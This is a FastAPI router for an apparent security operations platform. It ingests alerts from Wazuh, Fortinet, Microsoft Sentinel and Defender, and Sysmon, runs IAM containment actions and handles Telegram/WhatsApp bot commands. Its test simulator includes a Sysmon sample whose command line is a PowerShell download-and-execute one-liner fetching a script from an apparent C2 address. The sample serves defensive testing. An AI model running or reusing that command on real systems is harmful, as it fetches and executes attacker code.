from fastapi import APIRouter, BackgroundTasks, HTTPException, Body, Request
from pydantic import BaseModel
from typing import Dict, Any, List, Optional
import datetime

from app.integrations.wazuh_connector import wazuh_connector
from app.integrations.microsoft_security_connector import microsoft_connector
from app.integrations.sysmon_connector import sysmon_connector
from app.integrations.iam_connector import iam_connector
from app.integrations.fortinet_connector import fortinet_connector
from app.integrations.communication_bot import communication_bot
from app.api.routes_alerts import create_alert, AlertPayload
from app.api.websocket_manager import ws_manager

router = APIRouter(prefix="/api/integrations", tags=["integrations"])

class IAMActionRequest(BaseModel):
    user_principal_name: str
    action: str # "revoke_sessions" or "disable_account"
    provider: Optional[str] = "Microsoft Entra ID"

class ChatCommandRequest(BaseModel):
    command: str
    sender: Optional[str] = "Web Console"

class TestIntegrationRequest(BaseModel):
    connector: str # "wazuh", "sentinel", "defender", "sysmon", "iam", "fortinet", "telegram", "whatsapp"

class FortiGateBanRequest(BaseModel):
    target_ip: str
    duration_seconds: Optional[int] = 86400
    firewall_ip: Optional[str] = ""
    api_token: Optional[str] = ""

@router.get("/status")
def get_integrations_status() -> Dict[str, Any]:
    return {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "connectors": [
            {
                "id": "wazuh",
                "name": "Wazuh SIEM & HIDS",
                "category": "SIEM / Host Security",
                "status": "CONNECTED",
                "webhook_url": "/api/integrations/wazuh/webhook",
                "description": "Receives host intrusion alerts, FIM violations and syslog from Wazuh 4.14 agents."
            },
            {
                "id": "fortinet",
                "name": "Fortinet Security Fabric (FortiGate NGFW)",
                "category": "Next-Gen Firewall / Perimeter",
                "status": "ACTIVE",
                "webhook_url": "/api/integrations/fortinet/webhook",
                "description": "IPS attack logs, SSL-VPN anomaly feeds and automated FortiOS Banned IP quarantines."
            },
            {
                "id": "microsoft_sentinel",
                "name": "Microsoft Sentinel (Cloud SIEM)",
                "category": "Cloud SIEM / SOAR",
                "status": "ACTIVE",
                "webhook_url": "/api/integrations/microsoft/sentinel",
                "description": "Azure cloud incidents, Microsoft Graph security alerts and Entra ID telemetry."
            },
            {
                "id": "microsoft_defender",
                "name": "Microsoft Defender for Endpoint (MDE/XDR)",
                "category": "EDR / XDR",
                "status": "ACTIVE",
                "webhook_url": "/api/integrations/microsoft/defender",
                "description": "Endpoint detections, process trees, and automated machine isolation playbooks."
            },
            {
                "id": "sysmon",
                "name": "Windows Sysmon & Winlogbeat",
                "category": "Endpoint Telemetry",
                "status": "READY",
                "webhook_url": "/api/integrations/sysmon/event",
                "description": "Process creation (Event ID 1), Network connections (ID 3), File tampering (ID 11)."
            },
            {
                "id": "iam_entra",
                "name": "Microsoft Entra ID & IAM Directory",
                "category": "Identity & Access Management",
                "status": "ENABLED",
                "webhook_url": "/api/integrations/iam/action",
                "description": "Automated user token revocation, account quarantine, and credential containment."
            },
            {
                "id": "telegram_whatsapp_bot",
                "name": "Telegram & WhatsApp AI SOC Bot",
                "category": "Bidirectional ChatOps / Alerting",
                "status": "READY",
                "webhook_url": "/api/integrations/telegram/webhook",
                "description": "Instant alert dispatch to phone + interactive commands (/block, /status, /investigate)."
            }
        ]
    }

# =============================================================================
# INGESTION ENDPOINTS
# =============================================================================

@router.post("/wazuh/webhook")
async def ingest_wazuh_alert(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = wazuh_connector.parse_wazuh_alert(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Wazuh SIEM", "result": result}

@router.post("/fortinet/webhook")
async def ingest_fortinet_alert(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = fortinet_connector.parse_fortigate_log(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Fortinet Security Fabric (FortiGate)", "result": result}

@router.post("/fortinet/ban-ip")
async def execute_fortigate_ban(req: FortiGateBanRequest):
    res = await fortinet_connector.ban_ip_on_fortigate(req.firewall_ip, req.api_token, req.target_ip, req.duration_seconds)
    await ws_manager.broadcast("CONTAINMENT_ACTION", res)
    return res

@router.post("/microsoft/sentinel")
async def ingest_sentinel_incident(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = microsoft_connector.parse_sentinel_incident(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Microsoft Sentinel", "result": result}

@router.post("/microsoft/defender")
async def ingest_defender_alert(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = microsoft_connector.parse_defender_alert(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Microsoft Defender XDR", "result": result}

@router.post("/sysmon/event")
async def ingest_sysmon_event(payload: Dict[str, Any], background_tasks: BackgroundTasks):
    normalized = sysmon_connector.parse_sysmon_event(payload)
    alert_payload = AlertPayload(**normalized)
    result = await create_alert(alert_payload, background_tasks)
    return {"success": True, "source": "Windows Sysmon", "result": result}

@router.post("/iam/action")
async def execute_iam_action(request: IAMActionRequest):
    if request.action == "revoke_sessions":
        res = iam_connector.revoke_user_sessions(request.user_principal_name, request.provider)
    else:
        res = iam_connector.disable_user_account(request.user_principal_name, request.provider)
        
    await ws_manager.broadcast("IAM_ACTION", res)
    return res

# =============================================================================
# CHATOPS & BIDIRECTIONAL BOT ENDPOINTS (Telegram / WhatsApp / Webhook)
# =============================================================================

@router.post("/telegram/webhook")
async def telegram_webhook(payload: Dict[str, Any]):
    """Receives webhook message from Telegram Bot and replies with AI agent response"""
    message = payload.get("message", {})
    text = message.get("text", "")
    sender = message.get("from", {}).get("username", "Telegram User")
    
    # Check if callback query (inline button click)
    callback_query = payload.get("callback_query", {})
    if callback_query:
        data = callback_query.get("data", "")
        if data.startswith("block_"):
            ip = data.split("_")[1]
            reply = await communication_bot.process_incoming_command(f"/block {ip}", f"@{sender}")
            return {"status": "ok", "reply": reply}
            
    reply = await communication_bot.process_incoming_command(text, f"@{sender}")
    return {"status": "ok", "reply": reply}

@router.post("/whatsapp/webhook")
async def whatsapp_webhook(payload: Dict[str, Any]):
    """Receives webhook from WhatsApp Business / Evolution API"""
    data = payload.get("data", payload)
    message_text = data.get("message", {}).get("conversation") or data.get("body") or ""
    sender = data.get("key", {}).get("remoteJid", "WhatsApp Contact")
    
    reply = await communication_bot.process_incoming_command(message_text, f"WhatsApp ({sender})")
    return {"status": "ok", "reply": reply}

@router.post("/chat/command")
async def execute_chat_command(req: ChatCommandRequest):
    """Executes a chat command directly from the Web Admin Console"""
    reply = await communication_bot.process_incoming_command(req.command, req.sender)
    return {"command": req.command, "reply": reply}

# =============================================================================
# 1-CLICK TEST SIMULATOR FOR ALL CONNECTORS
# =============================================================================

@router.post("/test-trigger")
async def test_integration_trigger(request: TestIntegrationRequest, background_tasks: BackgroundTasks):
    c = request.connector.lower()
    
    if c == "wazuh":
        sample = {
            "id": "wazuh-sample-01",
            "rule": {"id": "100001", "level": 12, "description": "Wazuh SIEM: SSH Brute Force correlation (25 attempts)", "mitre": {"id": ["T1110"], "tactic": ["Credential Access"]}},
            "agent": {"name": "prod-auth-linux-01"},
            "data": {"srcip": "185.220.101.45", "dstip": "10.0.1.50"}
        }
        return await ingest_wazuh_alert(sample, background_tasks)
        
    elif c == "fortinet":
        sample = {
            "subtype": "ips",
            "devname": "FG-CORP-PERIMETER-01",
            "msg": "FortiGate IPS: Apache Struts OGNL Remote Code Execution Exploit Attempt",
            "srcip": "87.152.6.217",
            "dstip": "10.0.1.80",
            "crscore": "high"
        }
        return await ingest_fortinet_alert(sample, background_tasks)
        
    elif c == "sentinel":
        sample = {
            "IncidentTitle": "Anomalous Cloud Privilege Escalation in Azure Subscription",
            "Severity": "High",
            "relatedEntities": [{"kind": "Ip", "properties": {"address": "161.118.212.147"}}]
        }
        return await ingest_sentinel_incident(sample, background_tasks)
        
    elif c == "defender":
        sample = {
            "title": "Malicious PowerShell Script Execution Detected (Mimikatz memory dump attempt)",
            "severity": "Critical",
            "computerDnsName": "FINANCE-WORKSTATION-09",
            "mitreTechniques": ["T1059.001", "T1003"],
            "evidence": [{"ipAddress": "45.143.200.12"}]
        }
        return await ingest_defender_alert(sample, background_tasks)
        
    elif c == "sysmon":
        sample = {
            "EventID": 1,
            "Computer": "DC-PRIMARY-CORP.local",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -Nop -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/c2.ps1')",
            "DestinationIp": "185.220.101.45",
            "User": "NT AUTHORITY\\SYSTEM"
        }
        return await ingest_sysmon_event(sample, background_tasks)
        
    elif c == "iam":
        return await execute_iam_action(IAMActionRequest(
            user_principal_name="johndoe@empresa.com.br",
            action="revoke_sessions",
            provider="Microsoft Entra ID"
        ))
        
    elif c in ["telegram", "whatsapp"]:
        res = await communication_bot.dispatch_alert_notifications({
            "source_ip": "185.220.101.45",
            "rule_level": 13,
            "rule_description": "Alerta de Teste de Disparo Multicanal (Telegram / WhatsApp / Email)",
            "agent_name": "prod-gateway-01",
            "mitre_id": "T1110"
        }, {
            "ai_summary": "Simulação de notificação com botões interativos de contenção perimetral."
        })
        return {"success": True, "channel": c, "results": res}
        
    raise HTTPException(status_code=400, detail="Invalid connector type")
